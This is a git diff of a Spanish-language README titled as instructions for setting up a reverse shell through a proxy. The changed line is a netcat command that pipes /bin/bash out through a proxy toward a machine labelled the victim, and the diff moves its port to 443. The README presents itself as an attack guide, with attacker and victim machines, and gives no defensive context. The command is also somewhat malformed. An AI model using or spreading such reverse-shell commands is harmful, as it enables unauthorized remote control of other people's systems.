@@ -10,7 +10,7 @@ Este README proporciona instrucciones sobre cómo configurar una reverse shell d
 1. Máquina atacante (IP atacante):
 
 2. Ejecuta el siguiente comando para establecer una conexión a través del proxy y enviar la shell inversa:
-- nc -e /bin/bash (IP proxy) 443 | nc -v (IP víctima) 12345 Proxy ((IP proxy)):
+- nc -e /bin/bash (IP proxy) 443 | nc -v (IP víctima) 443 Proxy ((IP proxy)):
 
 # Ejecuta el siguiente comando para escuchar en el puerto 443 y redirigir el tráfico entrante a la máquina final:
 
